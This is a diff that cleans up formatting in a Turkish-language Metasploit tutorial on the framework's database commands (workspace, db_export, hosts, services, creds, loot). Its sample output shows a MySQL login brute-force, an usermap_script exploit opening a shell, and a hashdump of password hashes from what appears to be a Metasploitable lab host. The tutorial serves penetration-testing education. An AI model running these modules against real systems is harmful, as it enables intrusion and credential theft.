@@ -111,9 +111,9 @@ msf > workspace -h
 Usage:
     workspace                  List workspaces
     workspace -v               List workspaces verbosely
-    workspace **[**name]           Switch workspace
-    workspace -a **[**name] ...    Add workspace(s)
-    workspace -d **[**name] ...    Delete workspace(s)
+    workspace [name]           Switch workspace
+    workspace -a [name] ...    Add workspace(s)
+    workspace -d [name] ...    Delete workspace(s)
     workspace -D               Delete all workspaces
     workspace -r     Rename workspace
     workspace -h               Show this help information
@@ -222,16 +222,16 @@ msf >
 ```bash
 msf >  db_export -h
 Usage:
-    db_export -f  **[**-a**]** **[**filename]
+    db_export -f  [-a] [filename]
     Format can be one of: xml, pwdump
-**[**-] No output file was specified
+[-] No output file was specified
 ```
 
 Şimdi aktif olarak bulunduğumuz workspace içindeki bilgileri `xml` formatında dışa aktaralım.
 
 ```bash
 msf > db_export -f xml /root/msfu/Exported.xml
-> Starting export of workspace msfu to /root/msfu/Exported.xml **[** xml **]**...
+> Starting export of workspace msfu to /root/msfu/Exported.xml [ xml ]...
 >     **>>** Starting export of report
 >     **>>** Starting export of hosts
 >     **>>** Starting export of events
@@ -242,7 +242,7 @@ msf > db_export -f xml /root/msfu/Exported.xml
 >     **>>** Starting export of web forms
 >     **>>** Starting export of web vulns
 >     **>>** Finished export of report
-> Finished export of workspace msfu to /root/msfu/Exported.xml **[** xml **]**...
+> Finished export of workspace msfu to /root/msfu/Exported.xml [ xml ]...
 ```
 
 ## hosts
@@ -251,7 +251,7 @@ msf > db_export -f xml /root/msfu/Exported.xml
 
 ```bash
 msf > hosts -h
-Usage: hosts **[** options **]** **[**addr1 addr2 ...]
+Usage: hosts [ options ] [addr1 addr2 ...]
 
 OPTIONS:
   -a,--add          Add the hosts instead of searching
@@ -410,7 +410,7 @@ Yukarıda gördüğünüz gibi tüm IP adresleri RHOSTS içine aktarılmıştır
 ```bash
 msf > services -h
 
-Usage: services **[**-h**]** **[**-u**]** **[**-a**]** **[**-r **]** **[**-p >port1,port2>] **[**-s >name1,name2>] **[**-o **]** **[**addr1 addr2 ...]
+Usage: services [-h] [-u] [-a] [-r ] [-p >port1,port2>] [-s >name1,name2>] [-o ] [addr1 addr2 ...]
 
   -a,--add          Add the services instead of searching
   -d,--delete       Delete the services instead of searching
@@ -418,7 +418,7 @@ Usage: services **[**-h**]** **[**-u**]** **[**-a**]** **[**-r **]** **[**-p >po
   -h,--help         Show this help information
   -s   Search for **a list of service names
   -p   Search for **a list of ports
-  -r      Only show **[**tcp|udp] services
+  -r      Only show [tcp|udp] services
   -u,--up           Only show services which are up
   -o          Send output to a file **in **csv format
   -R,--rhosts       Set RHOSTS from the results of the search
@@ -577,7 +577,7 @@ host  port  user  pass  type  active?
 msf  auxiliary(mysql_login) > run
 
 > 172.16.194.172:3306 MYSQL - Found remote MySQL version 5.0.51a
-> 172.16.194.172:3306 MYSQL - **[**1/2] - Trying username:'root' with password:''
+> 172.16.194.172:3306 MYSQL - [1/2] - Trying username:'root' with password:''
 > 172.16.194.172:3306 - SUCCESSFUL LOGIN 'root' : ''
 > Scanned 1 of 1 hosts (100% complete)
 > Auxiliary module execution completed
@@ -602,7 +602,7 @@ Bir sistemde oturum açtığınızda, modül kullanmadan kendiniz bulduğunuz ku
 
 ```bash
 msf > creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
-> Time: 2012-06-20 20:31:42 UTC Credential: host**=**172.16.194.134 port**=**445 proto**=**tcp sname**=** type**=**password user**=**Administrator pass**=**7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: active**=**true
+> Time: 2012-06-20 20:31:42 UTC Credential: host=172.16.194.134 port=445 proto=tcp sname= type=password user=Administrator pass=7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: active=true
 
 msf > creds
 
@@ -623,9 +623,9 @@ Oturum açılan bir sistemde, genellikle ilk olarak `hashdump` yapılarak hash t
 ```bash
 msf > loot -h
 Usage: loot 
- Info: loot **[**-h**]** **[**addr1 addr2 ...] **[**-t **]**
-  Add: loot -f **[**fname] -i **[**info] -a **[**addr1 addr2 ...] **[**-t **[**type**]**
-  Del: loot -d **[**addr1 addr2 ...]
+ Info: loot [-h] [addr1 addr2 ...] [-t ]
+  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] [-t [type]
+  Del: loot -d [addr1 addr2 ...]
 
   -a,--add          Add loot to the list of addresses, instead of listing
   -d,--delete       Delete *****all***** loot matching host and type
@@ -655,7 +655,7 @@ msf  exploit(usermap_script) > exploit
 > Command shell session 1 opened (172.16.194.163:4444 -> 172.16.194.172:55138) at 2012-06-27 19:38:54 -0400
 
 ^Z
-Background session 1? **[**y/N]  y
+Background session 1? [y/N]  y
 
 msf  exploit(usermap_script) > use post/linux/gather/hashdump
 msf  post(hashdump) > show options
@@ -677,14 +677,14 @@ Active sessions
 
 msf  post(hashdump) > run
 
-**[**+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
-**[**+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
-**[**+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
-**[**+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
-**[**+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
-**[**+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
-**[**+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
-**[**+] Unshadowed Password File: /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
+[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
+[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
+[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
+[+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
+[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
+[+] Unshadowed Password File: /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
 > Post module execution completed
 ```
 
